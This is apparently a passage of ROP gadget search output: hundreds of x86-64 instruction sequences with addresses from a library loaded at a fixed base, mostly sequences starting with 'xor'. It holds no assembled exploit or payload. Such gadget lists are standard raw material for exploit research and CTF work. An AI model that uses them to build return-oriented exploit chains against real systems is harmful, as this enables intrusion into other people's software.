0x00002aaaaab20aaf : xor al, 2 ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaac6f4f5 : xor al, 2 ; add byte ptr [rdx], ah ; cli ; call rsp
0x00002aaaaac26156 : xor al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac9076c : xor al, 8 ; add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaab90655 : xor al, 8 ; mov qword ptr [rsp + 0xb8], r14 ; call r12
0x00002aaaaabdb97b : xor al, al ; or eax, edi ; ret
0x00002aaaaac26344 : xor al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabaa442 : xor al, byte ptr [rbx + rcx + 0x3d8d4800] ; ret
0x00002aaaaac4134a : xor al, byte ptr [rbx] ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac83145 : xor al, byte ptr [rcx] ; add al, bl ; out 0xf4, al ; jmp qword ptr [rbx]
0x00002aaaaac6ccc5 : xor al, byte ptr [rcx] ; add byte ptr [rax + rdx*4], al ; jmp rsp
0x00002aaaaac831a5 : xor al, byte ptr [rcx] ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac5be59 : xor al, dh ; jmp qword ptr [rax]
0x00002aaaaac69928 : xor al, dh ; sti ; inc dword ptr [rax - 0x2f00040f] ; sti ; jmp qword ptr [rax]
0x00002aaaaabcf9b8 : xor ax, ax ; ret
0x00002aaaaac69a69 : xor bh, ah ; call qword ptr [rax + 0x20fffc34]
0x00002aaaaac69aa9 : xor bh, ah ; call qword ptr [rax]
0x00002aaaaac69a49 : xor bh, ah ; call rax
0x00002aaaaac692c1 : xor bh, bl ; jmp qword ptr [rax + 0x40fffb33]
0x00002aaaaaad817f : xor bh, byte ptr [rsi - 0xd] ; add ebp, esi ; mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaac6a318 : xor bh, byte ptr [rsi - 4] ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac6997c : xor bh, dh ; sti ; inc dword ptr [rax - 0x2f000408] ; stc ; sti ; jmp qword ptr [rax]
0x00002aaaaabe62ba : xor bl, 0xff ; dec dword ptr [rax - 0x75] ; cmp byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab62fec : xor bl, al ; nop ; xor rax, rax ; ret
0x00002aaaaab9125a : xor bl, byte ptr [rax - 0x6af0ffd0] ; ret 0xf748
0x00002aaaaac74ac0 : xor bpl, bl ; call qword ptr [rcx]
0x00002aaaaabfd318 : xor byte ptr [eax - 0x7b], cl ; ror byte ptr [rax + 0xf], 0x44 ; ret 0x8b4c
0x00002aaaaab8006c : xor byte ptr [r11], r15b ; xor byte ptr [rbp + 0x3d], r14b ; ret
0x00002aaaaab62ead : xor byte ptr [r14 + 0xf], r12b ; xlatb ; ret
0x00002aaaaab1cbb7 : xor byte ptr [r8 - 0x75], r9b ; jg 0x47c2d ; xor eax, eax ; ret
0x00002aaaaab501a0 : xor byte ptr [r8 - 0x77], cl ; and byte ptr [r9 + 0x5bc03113], cl ; ret
0x00002aaaaac02cd2 : xor byte ptr [r8 - 0x77], cl ; ret 0x8b48
0x00002aaaaac09ce1 : xor byte ptr [r8 - 0x77], r9b ; push rdi ; cmp byte ptr [rax + 1], bh ; ret
0x00002aaaaac08812 : xor byte ptr [r8], r8b ; add byte ptr [rax], al ; add al, ch ; ret
0x00002aaaaabe5091 : xor byte ptr [rax + 0x39], cl ; ret 0xe975
0x00002aaaaab98a3b : xor byte ptr [rax + 0x63], cl ; ret 0x894c
0x00002aaaaabca10f : xor byte ptr [rax + 0x63], cl ; ret 0xc283
0x00002aaaaab5df51 : xor byte ptr [rax + 0xf], cl ; ret 0x90c3
0x00002aaaaab73576 : xor byte ptr [rax + 1], cl ; ret 0x547c
0x00002aaaaac26546 : xor byte ptr [rax + rax], al ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabffdc7 : xor byte ptr [rax - 0x73], cl ; add eax, 0x29cf71 ; pop rbx ; ret
0x00002aaaaabffd8f : xor byte ptr [rax - 0x73], cl ; add eax, 0x29cfa9 ; pop rbx ; ret
0x00002aaaaabffcd0 : xor byte ptr [rax - 0x73], cl ; add eax, 0x29d068 ; pop rbx ; ret
0x00002aaaaab7cb87 : xor byte ptr [rax - 0x73], cl ; ret
0x00002aaaaab5855d : xor byte ptr [rax - 0x75], cl ; add eax, 0x33f97b ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab1cf48 : xor byte ptr [rax - 0x75], cl ; jbe 0x47fc4 ; xor eax, eax ; ret
0x00002aaaaaafd041 : xor byte ptr [rax - 0x75], cl ; je 0x28075 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaaafdf11 : xor byte ptr [rax - 0x75], cl ; je 0x28f45 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaab92894 : xor byte ptr [rax - 0x75], cl ; je 0xbd8c5 ; cmp byte ptr [rcx + 1], cl ; ret
0x00002aaaaab1cbb8 : xor byte ptr [rax - 0x75], cl ; jg 0x47c2c ; xor eax, eax ; ret
0x00002aaaaab1cf47 : xor byte ptr [rax - 0x75], r9b ; jbe 0x47fc5 ; xor eax, eax ; ret
0x00002aaaaab5de7f : xor byte ptr [rax - 0x77], cl ; add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x00002aaaaac106fa : xor byte ptr [rax - 0x77], cl ; and al, 8 ; xor eax, eax ; call rdx
0x00002aaaaab501a1 : xor byte ptr [rax - 0x77], cl ; and byte ptr [r9 + 0x5bc03113], cl ; ret
0x00002aaaaab84a10 : xor byte ptr [rax - 0x77], cl ; call 0x4ccd8f2d
0x00002aaaaab89eb8 : xor byte ptr [rax - 0x77], cl ; call 0x4ccde3d5
0x00002aaaaab9cf59 : xor byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x75] ; and al, 0x10 ; call rax
0x00002aaaaab819ad : xor byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x00002aaaaac09fc8 : xor byte ptr [rax - 0x77], cl ; out dx, eax ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaab4bba3 : xor byte ptr [rax - 0x77], cl ; push rbx ; sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac09ce2 : xor byte ptr [rax - 0x77], cl ; push rdi ; cmp byte ptr [rax + 1], bh ; ret
0x00002aaaaab056c1 : xor byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaba40a6 : xor byte ptr [rax - 0x77], cl ; ret 0x8040
0x00002aaaaabb53cc : xor byte ptr [rax - 0x77], cl ; ret 0x8041
0x00002aaaaac02cd3 : xor byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaabab62e : xor byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab47b62 : xor byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x00002aaaaabfd319 : xor byte ptr [rax - 0x7b], cl ; ror byte ptr [rax + 0xf], 0x44 ; ret 0x8b4c
0x00002aaaaab082f5 : xor byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac6a2c8 : xor byte ptr [rax - 4], bh ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac69f58 : xor byte ptr [rax - 4], bl ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaab496ad : xor byte ptr [rax], 1 ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaac08813 : xor byte ptr [rax], al ; add byte ptr [rax], al ; add al, ch ; ret
0x00002aaaaaaf5b89 : xor byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0x28 ; jmp rax
0x00002aaaaab61ca8 : xor byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; jmp rax
0x00002aaaaaaf584e : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaab0efca : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x00002aaaaab0a323 : xor byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x00002aaaaabf4b1c : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rdi, qword ptr [rip + 0x2a7bd5] ; call rax
0x00002aaaaab1a0da : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip + 0x1cb] ; call rax
0x00002aaaaab44215 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip + 0x30] ; call rax
0x00002aaaaab50f05 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x15e0] ; call rax
0x00002aaaaab512f5 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x19d0] ; call rax
0x00002aaaaab51745 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x1e20] ; call rax
0x00002aaaaab4450e : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x2c9] ; call rax
0x00002aaaaab4fc35 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x310] ; call rax
0x00002aaaaab4fea5 : xor byte ptr [rax], al ; add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x580] ; call rax
0x00002aaaaab0f5f4 : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr fs:[rbp], rdx ; call rax
0x00002aaaaab046d4 : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, r13 ; call rax
0x00002aaaaab30e54 : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x367111] ; call rax
0x00002aaaaab307fe : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x367767] ; call rax
0x00002aaaaab25046 : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x372f1f] ; call rax
0x00002aaaaab223ca : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x375b9b] ; call rax
0x00002aaaaab7f105 : xor byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaabe9c7b : xor byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x114cb9 ; call rax
0x00002aaaaab22399 : xor byte ptr [rax], al ; add byte ptr [rax], al ; xor esi, esi ; call rax
0x00002aaaaab914da : xor byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab8fc31 : xor byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac697f0 : xor byte ptr [rax], al ; cld ; push rax ; add esp, edi ; call rax
0x00002aaaaab47aaa : xor byte ptr [rax], al ; je 0x72ab4 ; ret
0x00002aaaaab94267 : xor byte ptr [rax], al ; jne 0xbf283 ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab92fb1 : xor byte ptr [rax], al ; lea rcx, qword ptr [rax + r12] ; mov rdx, rax ; jmp 0xbdfc8
0x00002aaaaab8fb8d : xor byte ptr [rax], al ; mov dword ptr fs:[rax], 0x16 ; xor eax, eax ; ret
0x00002aaaaab938f5 : xor byte ptr [rax], al ; mov qword ptr [r14], rax ; mov rdi, rbx ; call 0x8ab7a
0x00002aaaaab90975 : xor byte ptr [rax], al ; neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab7e407 : xor byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab80070 : xor byte ptr [rbp + 0x3d], dh ; ret
0x00002aaaaab8006f : xor byte ptr [rbp + 0x3d], r14b ; ret
0x00002aaaaab50c60 : xor byte ptr [rbp + 0xd], 0x48 ; add esp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaac69500 : xor byte ptr [rbp - 0x482e0003], 0xfd ; call rcx
0x00002aaaaac47d9b : xor byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x84 ; ret
0x00002aaaaab47cb9 : xor byte ptr [rbx + 0x374fff8], al ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab599cc : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabf5e4c : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac7973f : xor byte ptr [rbx + 0xaea0206], al ; ret
0x00002aaaaabbd43e : xor byte ptr [rbx + r9*4 + 0x46], r8b ; xor al, 0x89 ; ret 0x4489
0x00002aaaaabbd43f : xor byte ptr [rbx + rcx*4 + 0x46], al ; xor al, 0x89 ; ret 0x4489
0x00002aaaaab63bab : xor byte ptr [rbx + rcx*4 + 0x76], cl ; cmp byte ptr [rax + 0xf], cl ; ret
0x00002aaaaab50fce : xor byte ptr [rbx - 0x198a0008], al ; pop rbx ; ret
0x00002aaaaabffc9d : xor byte ptr [rbx - 0x3d], bl ; ret
0x00002aaaaac855e0 : xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaac69878 : xor byte ptr [rbx], al ; cld ; call qword ptr [rax]
0x00002aaaaab8006d : xor byte ptr [rbx], bh ; xor byte ptr [rbp + 0x3d], r14b ; ret
0x00002aaaaaad6b24 : xor byte ptr [rcx + 0x3a6d4813], ah ; ret
0x00002aaaaac0225c : xor byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab56084 : xor byte ptr [rcx + rcx*4 + 0x44], cl ; and al, 0x28 ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x00002aaaaab11e9e : xor byte ptr [rcx - 0x77], al ; ret 0x8d48
0x00002aaaaab26377 : xor byte ptr [rcx - 0x7d], al ; std ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabe3baf : xor byte ptr [rcx - 0x7d], cl ; ret 0x4801
0x00002aaaaabb540e : xor byte ptr [rcx - 0x80], al ; stc ; adc dword ptr [rsi + rsi + 0x48], esi ; mov edx, eax ; jmp 0xe03b8
0x00002aaaaabb540d : xor byte ptr [rcx - 0x80], al ; stc ; adc dword ptr [rsi + rsi + 0x48], esi ; mov edx, eax ; jmp 0xe03b9
0x00002aaaaac692f0 : xor byte ptr [rcx - 5], cl ; call qword ptr [rax]
0x00002aaaaabd07dc : xor byte ptr [rcx], 0xc0 ; ret
0x00002aaaaac82fed : xor byte ptr [rcx], al ; add byte ptr [rax - 0x1d], al ; hlt ; call qword ptr [rsi]
0x00002aaaaac83005 : xor byte ptr [rcx], al ; add byte ptr [rax - 0x1d], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac17a01 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaac17c2c : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab496ae : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab4d4b7 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab42cb9 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x00002aaaaab3b8fa : xor byte ptr [rcx], dh ; imul cl ; ret
0x00002aaaaabf5e7b : xor byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaabdeaea : xor byte ptr [rcx], dh ; rol byte ptr [rbx - 0x69f0f601], 0xc0 ; ret
0x00002aaaaac69790 : xor byte ptr [rdi - 0x3dff0005], bh ; sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac695d0 : xor byte ptr [rdi - 0x482e0003], dh ; std ; call rcx
0x00002aaaaac6a4cc : xor byte ptr [rdi - 4], dh ; call rax
0x00002aaaaac69a20 : xor byte ptr [rdi], ch ; cld ; call qword ptr [rax]
0x00002aaaaabd5f81 : xor byte ptr [rdi], cl ; lahf ; ret 0xe883
0x00002aaaaab46cc0 : xor byte ptr [rdi], cl ; ret 0x4389
0x00002aaaaab26342 : xor byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabce7ed : xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0x8445
0x00002aaaaab5f846 : xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0xf201
0x00002aaaaab6a14c : xor byte ptr [rdx + 0xe], 0x2a ; ret
0x00002aaaaac7f530 : xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7a057 : xor byte ptr [rdx], al ; ret
0x00002aaaaac7e0f7 : xor byte ptr [rdx], al ; ret 0xe0a
0x00002aaaaac7ede0 : xor byte ptr [rdx], cl ; call rsi
0x00002aaaaac5a236 : xor byte ptr [rsi + 0x4ce2e5dd], 0x67 ; add ch, byte ptr [rbp + rbp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaac4290f : xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac4290a : xor byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab6197c : xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaab62eae : xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaaadfc88 : xor byte ptr [rsi + 7], dh ; add byte ptr [rax], al ; ret
0x00002aaaaab0dfea : xor byte ptr [rsi - 0x73], cl ; cmp al, 0x33 ; call rax
0x00002aaaaabca87c : xor byte ptr [rsi - 3], ch ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaac77090 : xor byte ptr [rsi], ah ; in eax, dx ; call rdx
0x00002aaaaac69274 : xor byte ptr [rsi], dl ; sti ; jmp qword ptr [rax]
0x00002aaaaac6c451 : xor ch, bh ; call rsp
0x00002aaaaac74ac1 : xor ch, bl ; call qword ptr [rcx]
0x00002aaaaac6969c : xor ch, bl ; sti ; call qword ptr [rax]
0x00002aaaaabb9b10 : xor ch, byte ptr [rcx] ; ret
0x00002aaaaab7e198 : xor ch, ch ; mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaab7e1ae : xor ch, ch ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1d0 : xor ch, ch ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e1ee : xor ch, ch ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e20e : xor ch, ch ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e234 : xor ch, ch ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7e250 : xor ch, ch ; mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7e270 : xor ch, ch ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaab7e290 : xor ch, ch ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7e2b6 : xor ch, ch ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e2d8 : xor ch, ch ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e2f6 : xor ch, ch ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaab7e316 : xor ch, ch ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7e332 : xor ch, ch ; mov byte ptr [rdi + 0x1d], ch ; ret
0x00002aaaaab7e352 : xor ch, ch ; mov byte ptr [rdi + 0x1e], ch ; ret
0x00002aaaaab7e372 : xor ch, ch ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaab7e392 : xor ch, ch ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7e3b8 : xor ch, ch ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e408 : xor ch, ch ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab7e0de : xor ch, ch ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e0fc : xor ch, ch ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7e11c : xor ch, ch ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7e13e : xor ch, ch ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7e15e : xor ch, ch ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7e17e : xor ch, ch ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaab7e014 : xor ch, ch ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaab7e026 : xor ch, ch ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaab7e03c : xor ch, ch ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab7e054 : xor ch, ch ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab7e06a : xor ch, ch ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e07c : xor ch, ch ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab7e09a : xor ch, ch ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab7e0a6 : xor ch, ch ; mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaab7e0bc : xor ch, ch ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab7e000 : xor ch, ch ; mov byte ptr [rdi], ch ; ret
0x00002aaaaac6992c : xor cl, 0xfb ; call rax
0x00002aaaaab6a63b : xor cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaac427bd : xor cl, byte ptr [rax - 0x75] ; add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac1512d : xor cl, byte ptr [rax - 0x75] ; and al, 8 ; add rsp, 0x18 ; ret
0x00002aaaaab98a36 : xor cl, byte ptr [rax - 0x75] ; jl 0xc3a67 ; xor byte ptr [rax + 0x63], cl ; ret 0x894c
0x00002aaaaac0673f : xor cl, byte ptr [rax - 0x77] ; jp 0x131751 ; ret
0x00002aaaaac094af : xor cl, byte ptr [rax - 0x77] ; jp 0x1344c1 ; ret
0x00002aaaaac094c7 : xor cl, byte ptr [rax - 0x77] ; jp 0x1344d9 ; ret
0x00002aaaaac09cff : xor cl, byte ptr [rax - 0x77] ; jp 0x134d11 ; ret
0x00002aaaaac09d17 : xor cl, byte ptr [rax - 0x77] ; jp 0x134d29 ; ret
0x00002aaaaac09d47 : xor cl, byte ptr [rax - 0x77] ; jp 0x134d59 ; ret
0x00002aaaaab57b95 : xor cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaabbbb5d : xor cl, byte ptr [rax - 0x7d] ; ret 0x4908
0x00002aaaaac0514c : xor cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaabe2271 : xor cl, byte ptr [rdi] ; mov dh, 0x4f ; add dword ptr [rcx - 0x7d], ecx ; ret 0x8408
0x00002aaaaabd7b82 : xor cl, byte ptr [rdx] ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaab34108 : xor cl, ch ; push rax ; loop 0x5f117 ; dec dword ptr [rcx + rcx*4 - 1] ; call 0x7b3ab
0x00002aaaaabe4e91 : xor cl, ch ; ret
0x00002aaaaab79b20 : xor cl, cl ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaac7d901 : xor cl, dh ; jmp qword ptr [rcx]
0x00002aaaaac5be5d : xor dh, al ; jmp qword ptr [rax + 0x33]
0x00002aaaaac6ce71 : xor dh, bl ; jmp rsp
0x00002aaaaabfca84 : xor dh, dh ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac03c14 : xor dh, dh ; ret 0xc707
0x00002aaaaabd7172 : xor dl, bh ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaab15540 : xor dl, byte ptr [rip - 0x3e7cb700] ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaab028ff : xor dword ptr [rax + 0x39], ecx ; ror byte ptr [rax - 0x39], 1 ; ret 0xffff
0x00002aaaaab5b6f5 : xor dword ptr [rax + 0xf], ecx ; scasd eax, dword ptr [rdi] ; ret 0x8948
0x00002aaaaac26494 : xor dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab80ccb : xor dword ptr [rax + rax], ecx ; ret
0x00002aaaaab5d723 : xor dword ptr [rax - 0x76b7ffcd], ebp ; and al, 8 ; call qword ptr [rdx]
0x00002aaaaab27bcd : xor dword ptr [rax - 0x77], ecx ; ror dword ptr [rax - 0x77], 1 ; ret 0xf7e9
0x00002aaaaab7316e : xor dword ptr [rax - 0x7c], eax ; div byte ptr [rbp - 0x14] ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaaba5d0e : xor dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac730b5 : xor dword ptr [rax], eax ; add al, bh ; ret
0x00002aaaaab71039 : xor dword ptr [rcx - 0x7d], ecx ; ret
0x00002aaaaac6f475 : xor dword ptr [rdx], eax ; add byte ptr [rcx + rbx - 6], dh ; jmp rsp
0x00002aaaaab2e46e : xor dword ptr [rip - 0x77cb800], eax ; dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaabd8023 : xor dword ptr [rsi], eax ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaab23618 : xor eax, 0x1304 ; add rax, rsi ; jmp rax
0x00002aaaaab1a0e0 : xor eax, 0x1cb ; call rax
0x00002aaaaac692c9 : xor eax, 0x1d10fffb ; sti ; inc dword ptr [rax + 0x3a] ; sti ; jmp qword ptr [rax]
0x00002aaaaabd05e3 : xor eax, 0x20 ; mov qword ptr [rsi + 0x48], rax ; ret
0x00002aaaaac699cd : xor eax, 0x2820fffc ; cld ; jmp rax
0x00002aaaaac699ad : xor eax, 0x2840fffc ; cld ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaab4421b : xor eax, 0x30 ; call rax
0x00002aaaaab38b68 : xor eax, 0x35f403 ; call rax
0x00002aaaaab30e5a : xor eax, 0x367111 ; call rax
0x00002aaaaab30804 : xor eax, 0x367767 ; call rax
0x00002aaaaac69fd5 : xor eax, 0x36a0fffc ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a015 : xor eax, 0x3720fffc ; cld ; jmp qword ptr [rax + 0x20fffc38]
0x00002aaaaab2504c : xor eax, 0x372f1f ; call rax
0x00002aaaaab223d0 : xor eax, 0x375b9b ; call rax
0x00002aaaaab4d181 : xor eax, 0x39480000 ; ret
0x00002aaaaab169ca : xor eax, 0x40b9 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4141d : xor eax, 0x48b4800 ; ret 0x8548
0x00002aaaaab466a7 : xor eax, 0x48ffff1e ; add esp, 0xd8 ; ret
0x00002aaaaac260a4 : xor eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab40375 : xor eax, 0x64d8f700 ; mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaac90b13 : xor eax, 0x78d0000 ; rol byte ptr [rcx], cl ; ret 0xa
0x00002aaaaabb6007 : xor eax, 0x83fff4cc ; call qword ptr [rax]
0x00002aaaaabf3bc7 : xor eax, 0x8b002a8a ; or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaaad7479 : xor eax, 0xdd410018 ; out 0xa9, al ; ret 0xbd07
0x00002aaaaab2d2e5 : xor eax, 0xf6ffffee ; ret 0xf10
0x00002aaaaab5174b : xor eax, 0xffffe1e0 ; call rax
0x00002aaaaab512fb : xor eax, 0xffffe630 ; call rax
0x00002aaaaab50f0b : xor eax, 0xffffea20 ; call rax
0x00002aaaaab4feab : xor eax, 0xfffffa80 ; call rax
0x00002aaaaab4fc3b : xor eax, 0xfffffcf0 ; call rax
0x00002aaaaab44514 : xor eax, 0xfffffd37 ; call rax
0x00002aaaaaaf5b86 : xor eax, dword ptr [0x30] ; add rsp, 0x28 ; jmp rax
0x00002aaaaab61ca5 : xor eax, dword ptr [0x30] ; add rsp, 8 ; jmp rax
0x00002aaaaaaf584b : xor eax, dword ptr [0x30] ; call rax
0x00002aaaaab0a320 : xor eax, dword ptr [0x30] ; jmp rax
0x00002aaaaab046d1 : xor eax, dword ptr [0x30] ; mov rdi, r13 ; call rax
0x00002aaaaab22396 : xor eax, dword ptr [0x30] ; xor esi, esi ; call rax
0x00002aaaaac262ab : xor eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab5c8d2 : xor eax, dword ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaab5cb58 : xor eax, dword ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab5ca41 : xor eax, dword ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
